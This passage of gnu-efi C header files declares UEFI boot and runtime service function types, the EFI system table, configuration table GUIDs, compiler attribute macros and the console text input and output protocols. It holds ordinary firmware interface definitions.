(EFIAPI *EFI_IMAGE_START) (
    IN EFI_HANDLE                   ImageHandle,
    OUT UINTN                       *ExitDataSize,
    OUT CHAR16                      **ExitData  OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_EXIT) (
    IN EFI_HANDLE                   ImageHandle,
    IN EFI_STATUS                   ExitStatus,
    IN UINTN                        ExitDataSize,
    IN CHAR16                       *ExitData OPTIONAL
    );


// Image handle
/*#define LOADED_IMAGE_PROTOCOL      \
    { 0x5B1B31A1, 0x9562, 0x11d2, {0x8E, 0x3F, 0x00, 0xA0, 0xC9, 0x69, 0x72, 0x3B} }

#define EFI_IMAGE_INFORMATION_REVISION      0x1000
typedef struct {
    UINT32                          Revision;
    EFI_HANDLE                      ParentHandle;
    struct _EFI_SYSTEM_TABLE        *SystemTable;

    // Source location of image
    EFI_HANDLE                      DeviceHandle;
    EFI_DEVICE_PATH                 *FilePath;
    VOID                            *Reserved;

    // Images load options
    UINT32                          LoadOptionsSize;
    VOID                            *LoadOptions;

    // Location of where image was loaded
    VOID                            *ImageBase;
    UINT64                          ImageSize;
    EFI_MEMORY_TYPE                 ImageCodeType;
    EFI_MEMORY_TYPE                 ImageDataType;

    // If the driver image supports a dynamic unload request
    EFI_IMAGE_UNLOAD                Unload;

} EFI_LOADED_IMAGE;*/


typedef
EFI_STATUS
(EFIAPI *EFI_EXIT_BOOT_SERVICES) (
    IN EFI_HANDLE                   ImageHandle,
    IN UINTN                        MapKey
    );

//
// Misc
//


typedef
EFI_STATUS
(EFIAPI *EFI_STALL) (
    IN UINTN                    Microseconds
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SET_WATCHDOG_TIMER) (
    IN UINTN                    Timeout,
    IN UINT64                   WatchdogCode,
    IN UINTN                    DataSize,
    IN CHAR16                   *WatchdogData OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_CONNECT_CONTROLLER) (
    IN EFI_HANDLE               ControllerHandle,
    IN EFI_HANDLE               *DriverImageHandle OPTIONAL,
    IN EFI_DEVICE_PATH          *RemainingDevicePath OPTIONAL,
    IN BOOLEAN                  Recursive
    );

typedef
EFI_STATUS
(EFIAPI *EFI_DISCONNECT_CONTROLLER) (
    IN EFI_HANDLE               ControllerHandle,
    IN EFI_HANDLE               DriverImageHandle OPTIONAL,
    IN EFI_HANDLE               ChildHandle OPTIONAL
    );

#define EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL  0x00000001
#define EFI_OPEN_PROTOCOL_GET_PROTOCOL        0x00000002
#define EFI_OPEN_PROTOCOL_TEST_PROTOCOL       0x00000004
#define EFI_OPEN_PROTOCOL_BY_CHILD_CONTROLLER 0x00000008
#define EFI_OPEN_PROTOCOL_BY_DRIVER           0x00000010
#define EFI_OPEN_PROTOCOL_EXCLUSIVE           0x00000020

typedef
EFI_STATUS
(EFIAPI *EFI_OPEN_PROTOCOL) (
    IN EFI_HANDLE               Handle,
    IN EFI_GUID                 *Protocol,
    OUT VOID                    **Interface OPTIONAL,
    IN EFI_HANDLE               AgentHandle,
    IN EFI_HANDLE               ControllerHandle,
    IN UINT32                   Attributes
    );

typedef
EFI_STATUS
(EFIAPI *EFI_CLOSE_PROTOCOL) (
    IN EFI_HANDLE               Handle,
    IN EFI_GUID                 *Protocol,
    IN EFI_HANDLE               AgentHandle,
    IN EFI_HANDLE               ControllerHandle
    );

typedef struct {
    EFI_HANDLE                  AgentHandle;
    EFI_HANDLE                  ControllerHandle;
    UINT32                      Attributes;
    UINT32                      OpenCount;
} EFI_OPEN_PROTOCOL_INFORMATION_ENTRY;

typedef
EFI_STATUS
(EFIAPI *EFI_OPEN_PROTOCOL_INFORMATION) (
    IN EFI_HANDLE               Handle,
    IN EFI_GUID                 *Protocol,
    OUT EFI_OPEN_PROTOCOL_INFORMATION_ENTRY **EntryBuffer,
    OUT UINTN                   *EntryCount
    );

typedef
EFI_STATUS
(EFIAPI *EFI_PROTOCOLS_PER_HANDLE) (
    IN EFI_HANDLE               Handle,
    OUT EFI_GUID                ***ProtocolBuffer,
    OUT UINTN                   *ProtocolBufferCount
    );

typedef enum {
    AllHandles,
    ByRegisterNotify,
    ByProtocol
} EFI_LOCATE_SEARCH_TYPE;

typedef
EFI_STATUS
(EFIAPI *EFI_LOCATE_HANDLE_BUFFER) (
    IN EFI_LOCATE_SEARCH_TYPE   SearchType,
    IN EFI_GUID                 *Protocol OPTIONAL,
    IN VOID                     *SearchKey OPTIONAL,
    IN OUT UINTN                *NoHandles,
    OUT EFI_HANDLE              **Buffer
    );

typedef
EFI_STATUS
(EFIAPI *EFI_LOCATE_PROTOCOL) (
    IN EFI_GUID                 *Protocol,
    IN VOID                     *Registration OPTIONAL,
    OUT VOID                    **Interface
    );

typedef
EFI_STATUS
(EFIAPI *EFI_INSTALL_MULTIPLE_PROTOCOL_INTERFACES) (
    IN OUT EFI_HANDLE           *Handle,
    ...
    );

typedef
EFI_STATUS
(EFIAPI *EFI_UNINSTALL_MULTIPLE_PROTOCOL_INTERFACES) (
    IN OUT EFI_HANDLE           Handle,
    ...
    );

typedef
EFI_STATUS
(EFIAPI *EFI_CALCULATE_CRC32) (
    IN VOID                     *Data,
    IN UINTN                    DataSize,
    OUT UINT32                  *Crc32
    );

typedef
VOID
(EFIAPI *EFI_COPY_MEM) (
    IN VOID                     *Destination,
    IN VOID                     *Source,
    IN UINTN                    Length
    );

typedef
VOID
(EFIAPI *EFI_SET_MEM) (
    IN VOID                     *Buffer,
    IN UINTN                    Size,
    IN UINT8                    Value
    );


typedef
EFI_STATUS
(EFIAPI *EFI_CREATE_EVENT_EX) (
    IN UINT32                   Type,
    IN EFI_TPL                  NotifyTpl,
    IN EFI_EVENT_NOTIFY         NotifyFunction OPTIONAL,
    IN const VOID               *NotifyContext OPTIONAL,
    IN const EFI_GUID           *EventGroup OPTIONAL,
    OUT EFI_EVENT               *Event
    );

typedef enum {
    EfiResetCold,
    EfiResetWarm,
    EfiResetShutdown
} EFI_RESET_TYPE;

typedef
EFI_STATUS
(EFIAPI *EFI_RESET_SYSTEM) (
    IN EFI_RESET_TYPE           ResetType,
    IN EFI_STATUS               ResetStatus,
    IN UINTN                    DataSize,
    IN CHAR16                   *ResetData OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_GET_NEXT_MONOTONIC_COUNT) (
    OUT UINT64                  *Count
    );

typedef
EFI_STATUS
(EFIAPI *EFI_GET_NEXT_HIGH_MONO_COUNT) (
    OUT UINT32                  *HighCount
    );

typedef struct {
    UINT64                      Length;
    union {
        EFI_PHYSICAL_ADDRESS    DataBlock;
       EFI_PHYSICAL_ADDRESS    ContinuationPointer;
    } Union;
} EFI_CAPSULE_BLOCK_DESCRIPTOR;

typedef struct {
    EFI_GUID                    CapsuleGuid;
    UINT32                      HeaderSize;
    UINT32                      Flags;
    UINT32                      CapsuleImageSize;
} EFI_CAPSULE_HEADER;

#define CAPSULE_FLAGS_PERSIST_ACROSS_RESET    0x00010000
#define CAPSULE_FLAGS_POPULATE_SYSTEM_TABLE   0x00020000
#define CAPSULE_FLAGS_INITIATE_RESET          0x00040000

typedef
EFI_STATUS
(EFIAPI *EFI_UPDATE_CAPSULE) (
    IN EFI_CAPSULE_HEADER       **CapsuleHeaderArray,
    IN UINTN                    CapsuleCount,
    IN EFI_PHYSICAL_ADDRESS     ScatterGatherList OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_QUERY_CAPSULE_CAPABILITIES) (
    IN  EFI_CAPSULE_HEADER       **CapsuleHeaderArray,
    IN  UINTN                    CapsuleCount,
    OUT UINT64                   *MaximumCapsuleSize,
    OUT EFI_RESET_TYPE           *ResetType
    );

typedef
EFI_STATUS
(EFIAPI *EFI_QUERY_VARIABLE_INFO) (
    IN  UINT32                  Attributes,
    OUT UINT64                  *MaximumVariableStorageSize,
    OUT UINT64                  *RemainingVariableStorageSize,
    OUT UINT64                  *MaximumVariableSize
    );

//
// Protocol handler functions
//

typedef enum {
    EFI_NATIVE_INTERFACE,
    EFI_PCODE_INTERFACE
} EFI_INTERFACE_TYPE;

typedef
EFI_STATUS
(EFIAPI *EFI_INSTALL_PROTOCOL_INTERFACE) (
    IN OUT EFI_HANDLE           *Handle,
    IN EFI_GUID                 *Protocol,
    IN EFI_INTERFACE_TYPE       InterfaceType,
    IN VOID                     *Interface
    );

typedef
EFI_STATUS
(EFIAPI *EFI_REINSTALL_PROTOCOL_INTERFACE) (
    IN EFI_HANDLE               Handle,
    IN EFI_GUID                 *Protocol,
    IN VOID                     *OldInterface,
    IN VOID                     *NewInterface
    );

typedef
EFI_STATUS
(EFIAPI *EFI_UNINSTALL_PROTOCOL_INTERFACE) (
    IN EFI_HANDLE               Handle,
    IN EFI_GUID                 *Protocol,
    IN VOID                     *Interface
    );

typedef
EFI_STATUS
(EFIAPI *EFI_HANDLE_PROTOCOL) (
    IN EFI_HANDLE               Handle,
    IN EFI_GUID                 *Protocol,
    OUT VOID                    **Interface
    );

typedef
EFI_STATUS 
(EFIAPI *EFI_REGISTER_PROTOCOL_NOTIFY) (
    IN EFI_GUID                 *Protocol,
    IN EFI_EVENT                Event,
    OUT VOID                    **Registration
    );

typedef
EFI_STATUS
(EFIAPI *EFI_LOCATE_HANDLE) (
    IN EFI_LOCATE_SEARCH_TYPE   SearchType,
    IN EFI_GUID                 *Protocol OPTIONAL,
    IN VOID                     *SearchKey OPTIONAL,
    IN OUT UINTN                *BufferSize,
    OUT EFI_HANDLE              *Buffer
    );

typedef
EFI_STATUS
(EFIAPI *EFI_LOCATE_DEVICE_PATH) (
    IN EFI_GUID                 *Protocol,
    IN OUT EFI_DEVICE_PATH      **DevicePath,
    OUT EFI_HANDLE              *Device
    );

typedef
EFI_STATUS
(EFIAPI *EFI_INSTALL_CONFIGURATION_TABLE) (
    IN EFI_GUID                 *Guid,
    IN VOID                     *Table
    );

typedef
EFI_STATUS
(EFIAPI *EFI_RESERVED_SERVICE) (
    );

//
// Standard EFI table header
//

typedef struct _EFI_TABLE_HEADER {
    UINT64                      Signature;
    UINT32                      Revision;
    UINT32                      HeaderSize;
    UINT32                      CRC32;
    UINT32                      Reserved;
} EFI_TABLE_HEADER;


//
// EFI Runtime Serivces Table
//

#define EFI_RUNTIME_SERVICES_SIGNATURE  0x56524553544e5552
#define EFI_RUNTIME_SERVICES_REVISION   (EFI_SPECIFICATION_MAJOR_REVISION<<16) | (EFI_SPECIFICATION_MINOR_REVISION)

typedef struct  {
    EFI_TABLE_HEADER                Hdr;

    //
    // Time services
    //

    EFI_GET_TIME                    GetTime;
    EFI_SET_TIME                    SetTime;
    EFI_GET_WAKEUP_TIME             GetWakeupTime;
    EFI_SET_WAKEUP_TIME             SetWakeupTime;

    //
    // Virtual memory services
    //

    EFI_SET_VIRTUAL_ADDRESS_MAP     SetVirtualAddressMap;
    EFI_CONVERT_POINTER             ConvertPointer;

    //
    // Variable serviers
    //

    EFI_GET_VARIABLE                GetVariable;
    EFI_GET_NEXT_VARIABLE_NAME      GetNextVariableName;
    EFI_SET_VARIABLE                SetVariable;

    //
    // Misc
    //

    EFI_GET_NEXT_HIGH_MONO_COUNT    GetNextHighMonotonicCount;
    EFI_RESET_SYSTEM                ResetSystem;

    EFI_UPDATE_CAPSULE              UpdateCapsule;
    EFI_QUERY_CAPSULE_CAPABILITIES  QueryCapsuleCapabilities;
    EFI_QUERY_VARIABLE_INFO         QueryVariableInfo;
} EFI_RUNTIME_SERVICES;


//
// EFI Boot Services Table
//

#define EFI_BOOT_SERVICES_SIGNATURE     0x56524553544f4f42
#define EFI_BOOT_SERVICES_REVISION      (EFI_SPECIFICATION_MAJOR_REVISION<<16) | (EFI_SPECIFICATION_MINOR_REVISION)

typedef struct _EFI_BOOT_SERVICES {

    EFI_TABLE_HEADER                Hdr;

    //
    // Task priority functions
    //

    EFI_RAISE_TPL                   RaiseTPL;
    EFI_RESTORE_TPL                 RestoreTPL;

    //
    // Memory functions
    //

    EFI_ALLOCATE_PAGES              AllocatePages;
    EFI_FREE_PAGES                  FreePages;
    EFI_GET_MEMORY_MAP              GetMemoryMap;
    EFI_ALLOCATE_POOL               AllocatePool;
    EFI_FREE_POOL                   FreePool;

    //
    // Event & timer functions
    //

    EFI_CREATE_EVENT                CreateEvent;
    EFI_SET_TIMER                   SetTimer;
    EFI_WAIT_FOR_EVENT              WaitForEvent;
    EFI_SIGNAL_EVENT                SignalEvent;
    EFI_CLOSE_EVENT                 CloseEvent;
    EFI_CHECK_EVENT                 CheckEvent;

    //
    // Protocol handler functions
    //

    EFI_INSTALL_PROTOCOL_INTERFACE  InstallProtocolInterface;
    EFI_REINSTALL_PROTOCOL_INTERFACE ReinstallProtocolInterface;
    EFI_UNINSTALL_PROTOCOL_INTERFACE UninstallProtocolInterface;
    EFI_HANDLE_PROTOCOL             HandleProtocol;
    EFI_HANDLE_PROTOCOL             PCHandleProtocol;
    EFI_REGISTER_PROTOCOL_NOTIFY    RegisterProtocolNotify;
    EFI_LOCATE_HANDLE               LocateHandle;
    EFI_LOCATE_DEVICE_PATH          LocateDevicePath;
    EFI_INSTALL_CONFIGURATION_TABLE InstallConfigurationTable;

    //
    // Image functions
    //

    EFI_IMAGE_LOAD                  LoadImage;
    EFI_IMAGE_START                 StartImage;
    EFI_EXIT                        Exit;
    EFI_IMAGE_UNLOAD                UnloadImage;
    EFI_EXIT_BOOT_SERVICES          ExitBootServices;

    //
    // Misc functions
    //

    EFI_GET_NEXT_MONOTONIC_COUNT    GetNextMonotonicCount;
    EFI_STALL                       Stall;
    EFI_SET_WATCHDOG_TIMER          SetWatchdogTimer;

    //
    // DriverSupport Services
    //

    EFI_CONNECT_CONTROLLER          ConnectController;
    EFI_DISCONNECT_CONTROLLER       DisconnectController;

    //
    // Open and Close Protocol Services
    //
    EFI_OPEN_PROTOCOL               OpenProtocol;
    EFI_CLOSE_PROTOCOL              CloseProtocol;
    EFI_OPEN_PROTOCOL_INFORMATION   OpenProtocolInformation;

    //
    // Library Services
    //
    EFI_PROTOCOLS_PER_HANDLE        ProtocolsPerHandle;
    EFI_LOCATE_HANDLE_BUFFER        LocateHandleBuffer;
    EFI_LOCATE_PROTOCOL             LocateProtocol;
    EFI_INSTALL_MULTIPLE_PROTOCOL_INTERFACES InstallMultipleProtocolInterfaces;
    EFI_UNINSTALL_MULTIPLE_PROTOCOL_INTERFACES UninstallMultipleProtocolInterfaces;

    //
    // 32-bit CRC Services
    //
    EFI_CALCULATE_CRC32             CalculateCrc32;

    //
    // Misc Services
    //
    EFI_COPY_MEM                    CopyMem;
    EFI_SET_MEM                     SetMem;
    EFI_CREATE_EVENT_EX             CreateEventEx;
} EFI_BOOT_SERVICES;


//
// EFI Configuration Table and GUID definitions
//

#define MPS_TABLE_GUID    \
    { 0xeb9d2d2f, 0x2d88, 0x11d3, {0x9a, 0x16, 0x0, 0x90, 0x27, 0x3f, 0xc1, 0x4d} }

#define ACPI_TABLE_GUID    \
    { 0xeb9d2d30, 0x2d88, 0x11d3, {0x9a, 0x16, 0x0, 0x90, 0x27, 0x3f, 0xc1, 0x4d} }

#define ACPI_20_TABLE_GUID  \
    { 0x8868e871, 0xe4f1, 0x11d3, {0xbc, 0x22, 0x0, 0x80, 0xc7, 0x3c, 0x88, 0x81} }

#define SMBIOS_TABLE_GUID    \
    { 0xeb9d2d31, 0x2d88, 0x11d3, {0x9a, 0x16, 0x0, 0x90, 0x27, 0x3f, 0xc1, 0x4d} }

#define SMBIOS3_TABLE_GUID    \
    { 0xf2fd1544, 0x9794, 0x4a2c, {0x99, 0x2e, 0xe5, 0xbb, 0xcf, 0x20, 0xe3, 0x94} }

#define SAL_SYSTEM_TABLE_GUID    \
    { 0xeb9d2d32, 0x2d88, 0x11d3, {0x9a, 0x16, 0x0, 0x90, 0x27, 0x3f, 0xc1, 0x4d} }

#define EFI_DTB_TABLE_GUID \
    { 0xb1b621d5, 0xf19c, 0x41a5, {0x83, 0x0b, 0xd9, 0x15, 0x2c, 0x69, 0xaa, 0xe0} }

typedef struct _EFI_CONFIGURATION_TABLE {
    EFI_GUID                VendorGuid;
    VOID                    *VendorTable;
} EFI_CONFIGURATION_TABLE;


//
// EFI System Table
//




#define EFI_SYSTEM_TABLE_SIGNATURE      0x5453595320494249
#define EFI_SYSTEM_TABLE_REVISION      (EFI_SPECIFICATION_MAJOR_REVISION<<16) | (EFI_SPECIFICATION_MINOR_REVISION)

typedef struct _EFI_SYSTEM_TABLE {
    EFI_TABLE_HEADER                Hdr;

    CHAR16                          *FirmwareVendor;
    UINT32                          FirmwareRevision;

    EFI_HANDLE                      ConsoleInHandle;
    SIMPLE_INPUT_INTERFACE          *ConIn;

    EFI_HANDLE                      ConsoleOutHandle;
    SIMPLE_TEXT_OUTPUT_INTERFACE    *ConOut;

    EFI_HANDLE                      StandardErrorHandle;
    SIMPLE_TEXT_OUTPUT_INTERFACE    *StdErr;

    EFI_RUNTIME_SERVICES            *RuntimeServices;
    EFI_BOOT_SERVICES               *BootServices;

    UINTN                           NumberOfTableEntries;
    EFI_CONFIGURATION_TABLE         *ConfigurationTable;

} EFI_SYSTEM_TABLE;

#endif


```

`include/gnu-efi/eficompiler.h`:

```h
/*++

Copyright (c) 2016 Pete Batard <pete@akeo.ie>

Module Name:

    eficompiler.h

Abstract:

    Compiler specific adjustments

--*/

#ifdef _MSC_EXTENSIONS
#define EFI_UNUSED
#else
#define EFI_UNUSED __attribute__((__unused__))
#endif

#ifdef _MSC_EXTENSIONS
#define ALIGN(x) __declspec(align(x))
#else
#define ALIGN(x) __attribute__((__aligned__(x)))
#endif

/* Also add a catch-all on __attribute__() for MS compilers */
#ifdef _MSC_EXTENSIONS
#define __attribute__(x)
#endif

```

`include/gnu-efi/eficon.h`:

```h
#ifndef _EFI_CON_H
#define _EFI_CON_H

/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    eficon.h

Abstract:

    EFI console protocols



Revision History

--*/

//
// Text output protocol
//

#define EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL_GUID \
    { 0x387477c2, 0x69c7, 0x11d2, {0x8e, 0x39, 0x0, 0xa0, 0xc9, 0x69, 0x72, 0x3b} }
#define SIMPLE_TEXT_OUTPUT_PROTOCOL EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL_GUID

INTERFACE_DECL(_SIMPLE_TEXT_OUTPUT_INTERFACE);

typedef
EFI_STATUS
(EFIAPI *EFI_TEXT_RESET) (
    IN struct _SIMPLE_TEXT_OUTPUT_INTERFACE     *This,
    IN BOOLEAN                      ExtendedVerification
    );

typedef
EFI_STATUS
(EFIAPI *EFI_TEXT_OUTPUT_STRING) (
    IN struct _SIMPLE_TEXT_OUTPUT_INTERFACE     *This,
    IN CHAR16                       *String
    );

typedef
EFI_STATUS
(EFIAPI *EFI_TEXT_TEST_STRING) (
    IN struct _SIMPLE_TEXT_OUTPUT_INTERFACE     *This,
    IN CHAR16                       *String
    );

typedef
EFI_STATUS
(EFIAPI *EFI_TEXT_QUERY_MODE) (
    IN struct _SIMPLE_TEXT_OUTPUT_INTERFACE     *This,
    IN UINTN                        ModeNumber,
    OUT UINTN                       *Columns,
    OUT UINTN                       *Rows
    );

typedef
EFI_STATUS
(EFIAPI *EFI_TEXT_SET_MODE) (
    IN struct _SIMPLE_TEXT_OUTPUT_INTERFACE     *This,
    IN UINTN                        ModeNumber
    );

typedef
EFI_STATUS
(EFIAPI *EFI_TEXT_SET_ATTRIBUTE) (
    IN struct _SIMPLE_TEXT_OUTPUT_INTERFACE     *This,
    IN UINTN                        Attribute
    );

#define EFI_BLACK   0x00
#define EFI_BLUE    0x01
#define EFI_GREEN   0x02
#define EFI_CYAN            (EFI_BLUE | EFI_GREEN)
#define EFI_RED     0x04
#define EFI_MAGENTA         (EFI_BLUE | EFI_RED)
#define EFI_BROWN           (EFI_GREEN | EFI_RED)
#define EFI_LIGHTGRAY       (EFI_BLUE | EFI_GREEN | EFI_RED)
#define EFI_BRIGHT  0x08
#define EFI_DARKGRAY        (EFI_BRIGHT)
#define EFI_LIGHTBLUE       (EFI_BLUE | EFI_BRIGHT)
#define EFI_LIGHTGREEN      (EFI_GREEN | EFI_BRIGHT)
#define EFI_LIGHTCYAN       (EFI_CYAN | EFI_BRIGHT)
#define EFI_LIGHTRED        (EFI_RED | EFI_BRIGHT)
#define EFI_LIGHTMAGENTA    (EFI_MAGENTA | EFI_BRIGHT)
#define EFI_YELLOW          (EFI_BROWN | EFI_BRIGHT)
#define EFI_WHITE           (EFI_BLUE | EFI_GREEN | EFI_RED | EFI_BRIGHT)

#define EFI_TEXT_ATTR(f,b)  ((f) | ((b) << 4))

#define EFI_BACKGROUND_BLACK        0x00
#define EFI_BACKGROUND_BLUE         0x10
#define EFI_BACKGROUND_GREEN        0x20
#define EFI_BACKGROUND_CYAN         (EFI_BACKGROUND_BLUE | EFI_BACKGROUND_GREEN)
#define EFI_BACKGROUND_RED          0x40
#define EFI_BACKGROUND_MAGENTA      (EFI_BACKGROUND_BLUE | EFI_BACKGROUND_RED)
#define EFI_BACKGROUND_BROWN        (EFI_BACKGROUND_GREEN | EFI_BACKGROUND_RED)
#define EFI_BACKGROUND_LIGHTGRAY    (EFI_BACKGROUND_BLUE | EFI_BACKGROUND_GREEN | EFI_BACKGROUND_RED)


typedef
EFI_STATUS
(EFIAPI *EFI_TEXT_CLEAR_SCREEN) (
    IN struct _SIMPLE_TEXT_OUTPUT_INTERFACE     *This
    );

typedef
EFI_STATUS
(EFIAPI *EFI_TEXT_SET_CURSOR_POSITION) (
    IN struct _SIMPLE_TEXT_OUTPUT_INTERFACE     *This,
    IN UINTN                        Column,
    IN UINTN                        Row
    );

typedef
EFI_STATUS
(EFIAPI *EFI_TEXT_ENABLE_CURSOR) (
    IN struct _SIMPLE_TEXT_OUTPUT_INTERFACE     *This,
    IN BOOLEAN                      Enable
    );

typedef struct {
    INT32                           MaxMode;
    // current settings
    INT32                           Mode;
    INT32                           Attribute;
    INT32                           CursorColumn;
    INT32                           CursorRow;
    BOOLEAN                         CursorVisible;
} SIMPLE_TEXT_OUTPUT_MODE;

typedef struct _SIMPLE_TEXT_OUTPUT_INTERFACE {
    EFI_TEXT_RESET                  Reset;

    EFI_TEXT_OUTPUT_STRING          OutputString;
    EFI_TEXT_TEST_STRING            TestString;

    EFI_TEXT_QUERY_MODE             QueryMode;
    EFI_TEXT_SET_MODE               SetMode;
    EFI_TEXT_SET_ATTRIBUTE          SetAttribute;

    EFI_TEXT_CLEAR_SCREEN           ClearScreen;
    EFI_TEXT_SET_CURSOR_POSITION    SetCursorPosition;
    EFI_TEXT_ENABLE_CURSOR          EnableCursor;

    // Current mode
    SIMPLE_TEXT_OUTPUT_MODE         *Mode;
} SIMPLE_TEXT_OUTPUT_INTERFACE, EFI_SIMPLE_TEXT_OUT_PROTOCOL;

//
// Define's for required EFI Unicode Box Draw character
//

#define BOXDRAW_HORIZONTAL                  0x2500
#define BOXDRAW_VERTICAL                    0x2502
#define BOXDRAW_DOWN_RIGHT                  0x250c
#define BOXDRAW_DOWN_LEFT                   0x2510
#define BOXDRAW_UP_RIGHT                    0x2514
#define BOXDRAW_UP_LEFT                     0x2518
#define BOXDRAW_VERTICAL_RIGHT              0x251c
#define BOXDRAW_VERTICAL_LEFT               0x2524
#define BOXDRAW_DOWN_HORIZONTAL             0x252c
#define BOXDRAW_UP_HORIZONTAL               0x2534
#define BOXDRAW_VERTICAL_HORIZONTAL         0x253c

#define BOXDRAW_DOUBLE_HORIZONTAL           0x2550
#define BOXDRAW_DOUBLE_VERTICAL             0x2551
#define BOXDRAW_DOWN_RIGHT_DOUBLE           0x2552
#define BOXDRAW_DOWN_DOUBLE_RIGHT           0x2553
#define BOXDRAW_DOUBLE_DOWN_RIGHT           0x2554

#define BOXDRAW_DOWN_LEFT_DOUBLE            0x2555
#define BOXDRAW_DOWN_DOUBLE_LEFT            0x2556
#define BOXDRAW_DOUBLE_DOWN_LEFT            0x2557

#define BOXDRAW_UP_RIGHT_DOUBLE             0x2558
#define BOXDRAW_UP_DOUBLE_RIGHT             0x2559
#define BOXDRAW_DOUBLE_UP_RIGHT             0x255a

#define BOXDRAW_UP_LEFT_DOUBLE              0x255b
#define BOXDRAW_UP_DOUBLE_LEFT              0x255c
#define BOXDRAW_DOUBLE_UP_LEFT              0x255d

#define BOXDRAW_VERTICAL_RIGHT_DOUBLE       0x255e
#define BOXDRAW_VERTICAL_DOUBLE_RIGHT       0x255f
#define BOXDRAW_DOUBLE_VERTICAL_RIGHT       0x2560

#define BOXDRAW_VERTICAL_LEFT_DOUBLE        0x2561
#define BOXDRAW_VERTICAL_DOUBLE_LEFT        0x2562
#define BOXDRAW_DOUBLE_VERTICAL_LEFT        0x2563

#define BOXDRAW_DOWN_HORIZONTAL_DOUBLE      0x2564
#define BOXDRAW_DOWN_DOUBLE_HORIZONTAL      0x2565
#define BOXDRAW_DOUBLE_DOWN_HORIZONTAL      0x2566

#define BOXDRAW_UP_HORIZONTAL_DOUBLE        0x2567
#define BOXDRAW_UP_DOUBLE_HORIZONTAL        0x2568
#define BOXDRAW_DOUBLE_UP_HORIZONTAL        0x2569

#define BOXDRAW_VERTICAL_HORIZONTAL_DOUBLE  0x256a
#define BOXDRAW_VERTICAL_DOUBLE_HORIZONTAL  0x256b
#define BOXDRAW_DOUBLE_VERTICAL_HORIZONTAL  0x256c

//
// EFI Required Block Elements Code Chart
//

#define BLOCKELEMENT_FULL_BLOCK             0x2588
#define BLOCKELEMENT_LIGHT_SHADE            0x2591
//
// EFI Required Geometric Shapes Code Chart
//

#define GEOMETRICSHAPE_UP_TRIANGLE           0x25b2
#define GEOMETRICSHAPE_RIGHT_TRIANGLE        0x25ba
#define GEOMETRICSHAPE_DOWN_TRIANGLE         0x25bc
#define GEOMETRICSHAPE_LEFT_TRIANGLE         0x25c4

//
// EFI Required Arrow shapes
//

#define ARROW_UP                            0x2191
#define ARROW_DOWN                          0x2193

//
// Text input protocol
//

#define EFI_SIMPLE_TEXT_INPUT_PROTOCOL_GUID \
    { 0x387477c1, 0x69c7, 0x11d2, {0x8e, 0x39, 0x0, 0xa0, 0xc9, 0x69, 0x72, 0x3b} }
#define SIMPLE_TEXT_INPUT_PROTOCOL EFI_SIMPLE_TEXT_INPUT_PROTOCOL_GUID

INTERFACE_DECL(_SIMPLE_INPUT_INTERFACE);

typedef struct {
    UINT16                              ScanCode;
    CHAR16                              UnicodeChar;
} EFI_INPUT_KEY;

//
// Baseline unicode control chars
//

#define CHAR_NULL                       0x0000
#define CHAR_BACKSPACE                  0x0008
#define CHAR_TAB                        0x0009
#define CHAR_LINEFEED                   0x000A
#define CHAR_CARRIAGE_RETURN            0x000D

//
// Scan codes for base line keys
//

#define SCAN_NULL                       0x0000
#define SCAN_UP                         0x0001
#define SCAN_DOWN                       0x0002
#define SCAN_RIGHT                      0x0003
#define SCAN_LEFT                       0x0004
#define SCAN_HOME                       0x0005
#define SCAN_END                        0x0006
#define SCAN_INSERT                     0x0007
#define SCAN_DELETE                     0x0008
#define SCAN_PAGE_UP                    0x0009
#define SCAN_PAGE_DOWN                  0x000A
#define SCAN_F1                         0x000B
#define SCAN_F2                         0x000C
#define SCAN_F3                         0x000D
#define SCAN_F4                         0x000E
#define SCAN_F5                         0x000F
#define SCAN_F6                         0x0010
#define SCAN_F7                         0x0011
#define SCAN_F8                         0x0012
#define SCAN_F9                         0x0013
#define SCAN_F10                        0x0014
#define SCAN_F11                        0x0015
#define SCAN_F12                        0x0016
#define SCAN_ESC                        0x0017

typedef
EFI_STATUS
(EFIAPI *EFI_INPUT_RESET) (
    IN struct _SIMPLE_INPUT_INTERFACE   *This,
    IN BOOLEAN                          ExtendedVerification
    );

typedef
EFI_STATUS
(EFIAPI *EFI_INPUT_READ_KEY) (
    IN struct _SIMPLE_INPUT_INTERFACE   *This,
    OUT EFI_INPUT_KEY                   *Key
    );

typedef struct _SIMPLE_INPUT_INTERFACE {
    EFI_INPUT_RESET                     Reset;
    EFI_INPUT_READ_KEY                  ReadKeyStroke;
    EFI_EVENT                           WaitForKey;
} SIMPLE_INPUT_INTERFACE, EFI_SIMPLE_TEXT_IN_PROTOCOL;

#endif


```

`include/gnu-efi/eficonex.h`:

```h
#ifndef _EFI_CONEX_H
#define _EFI_CONEX_H

/*++

Copyright (c) 2020 Kagurazaka Kotori <kagurazakakotori@gmail.com>

Module Name:

    eficonex.h

Abstract:

    EFI console extension protocols

--*/

//
// Simple Text Input Ex Protocol
//

#define EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL_GUID \
    { 0xdd9e7534, 0x7762, 0x4698, {0x8c, 0x14, 0xf5, 0x85, 0x17, 0xa6, 0x25, 0xaa} }

INTERFACE_DECL(_EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL);

typedef UINT8 EFI_KEY_TOGGLE_STATE;

typedef struct EFI_KEY_STATE {
    UINT32                                         KeyShiftState;
    EFI_KEY_TOGGLE_STATE                           KeyToggleState;
} EFI_KEY_STATE;

typedef struct {
    EFI_INPUT_KEY                                  Key;
    EFI_KEY_STATE                                  KeyState;
} EFI_KEY_DATA;

// Shift states
#define EFI_SHIFT_STATE_VALID                      0x80000000
#define EFI_RIGHT_SHIFT_PRESSED                    0x00000001
#define EFI_LEFT_SHIFT_PRESSED                     0x00000002
#define EFI_RIGHT_CONTROL_PRESSED                  0x00000004
#define EFI_LEFT_CONTROL_PRESSED                   0x00000008
#define EFI_RIGHT_ALT_PRESSED                      0x00000010
#define EFI_LEFT_ALT_PRESSED                       0x00000020
#define EFI_RIGHT_LOGO_PRESSED                     0x00000040
#define EFI_LEFT_LOGO_PRESSED                      0x00000080
